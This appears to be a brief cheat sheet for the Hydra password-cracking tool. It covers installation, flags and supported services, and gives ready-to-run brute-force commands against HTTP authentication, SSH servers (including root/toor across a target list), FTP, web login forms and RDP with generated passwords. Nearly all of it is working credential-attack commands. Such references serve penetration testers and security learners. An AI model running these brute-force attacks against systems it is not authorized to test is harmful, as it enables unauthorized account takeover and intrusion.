```shell-session
sudo apt-get -y update
sudo apt-get -y install hydra 
```

Usage:
** hydra [login_options] [password_options] [attack_options] [service_options]

## Flags
-l LOGIN (single username) or -L FILE
-p PASS or -P FILE
-t TASKS (threads)
-f (stop attack after first successful login)
-s PORT
-v or -V (verbose)
service://server (ssh://192.168.1.100)
/OPT (http-get://exmaple.com/login.php -m "POST:user=^USER^&pass=^PASS^"

## Services
- ftp
- ssh
- http-get/post
- smtp
- pop3
- imap
- mysql
- mssql
- vnc
- rdp

## Brute-Forcing HTTP Authentication
```shell-session
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

## Targeting Multiple SSH Servers
```shell-session
hydra -l root -p toor -M targets.txt ssh
```

## Testing FTP Credentials on a Non-Standard Port
```shell-session
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

## Brute-Forcing a Web Login Form
```shell-session
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

## Advanced RDP Brute-Forcing
```shell-session
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
- This generates and test passwords ranging from 6 to 8 characters, using the specified character set.
